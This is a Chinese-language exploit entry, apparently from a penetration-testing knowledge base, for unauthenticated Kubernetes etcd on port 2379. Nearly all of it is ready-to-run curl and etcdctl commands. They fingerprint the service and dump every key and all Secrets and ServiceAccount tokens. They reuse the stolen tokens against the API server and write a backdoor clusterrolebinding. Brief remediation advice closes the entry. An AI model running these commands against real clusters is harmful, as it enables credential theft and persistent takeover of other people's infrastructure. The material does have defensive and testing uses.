---
id: K8S-ETCD-UNAUTH
title: Kubernetes etcd 未授权访问数据泄露
product: kubernetes
vendor: CNCF
version_affected: "all versions"
severity: CRITICAL
tags: [k8s, etcd, data_leak, 云原生, 无需认证]
fingerprint: ["etcd", "Kubernetes", "k8s", ":2379", ":2380"]
---

## 漏洞描述

etcd是K8s的后端键值存储，保存了集群的所有配置数据，包括Secret（数据库密码、API密钥、TLS证书等）。默认端口2379（客户端）和2380（集群通信）。如果etcd未配置客户端证书认证或允许匿名访问，攻击者可直接读取所有集群数据。

## 影响版本

- etcd 全版本（配置不当时）

## 前置条件

- 目标开放 2379 端口（客户端API）
- etcd 未配置客户端证书认证，允许匿名访问
- 无需认证凭据

## 利用步骤

### Step 1: 探测etcd

```bash
curl -s http://target:2379/version
curl -sk https://target:2379/version
# 返回 {"etcdserver":"3.x.x","etcdcluster":"3.x.0"}
```

### Step 2: 读取所有Key

```bash
# etcd v3 API
ETCDCTL_API=3 etcdctl --endpoints=http://target:2379 get / --prefix --keys-only

# 或使用curl (v3 API)
curl -s http://target:2379/v3/kv/range \
  -X POST -d '{"key":"Lw==","range_end":"MA=="}'
```

### Step 3: 窃取K8s Secrets

```bash
# 获取所有Secret
ETCDCTL_API=3 etcdctl --endpoints=http://target:2379 \
  get /registry/secrets --prefix

# 获取特定namespace的secret
ETCDCTL_API=3 etcdctl --endpoints=http://target:2379 \
  get /registry/secrets/kube-system --prefix

# 获取ServiceAccount token
ETCDCTL_API=3 etcdctl --endpoints=http://target:2379 \
  get /registry/secrets/kube-system/default-token --prefix
```

### Step 4: 利用窃取的凭据

```bash
# 解码secret中的token
echo "BASE64_TOKEN" | base64 -d

# 用token访问API Server
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://API_SERVER:6443/api/v1/namespaces/kube-system/pods
```

### Step 5: 修改集群配置（写入后门）

```bash
# 写入恶意数据
ETCDCTL_API=3 etcdctl --endpoints=http://target:2379 \
  put /registry/clusterrolebindings/pwn '...'
```

## Payload

```bash
# 获取etcd版本
curl -s http://target:2379/version

# 读取所有Key（v3 API，key="/" base64="Lw==", range_end="0" base64="MA=="）
curl -s http://target:2379/v3/kv/range \
  -X POST -d '{"key":"Lw==","range_end":"MA=="}'

# 读取K8s Secrets（v2 API）
curl -s http://target:2379/v2/keys/registry/secrets/?recursive=true
```

## 验证方法

```bash
# 验证etcd未授权访问
curl -s -o /dev/null -w "%{http_code}" http://target:2379/version
# 返回200并包含etcdserver版本信息表示可访问

# 验证数据读取
curl -s http://target:2379/v3/kv/range \
  -X POST -d '{"key":"Lw==","range_end":"MA==","limit":"1"}' | grep -c "kvs"
# 返回包含kvs字段表示可读取数据

# HTTPS场景
curl -sk https://target:2379/version
```

## 指纹确认

```bash
curl -s http://target:2379/version
curl -s http://target:2379/health
nmap -p 2379,2380 target
```

## 修复建议

1. 启用客户端证书认证（`--client-cert-auth=true`）
2. 防火墙限制2379/2380端口只允许K8s组件访问
3. 加密etcd中存储的Secret（`--encryption-provider-config`）
4. 不要将etcd暴露在公网
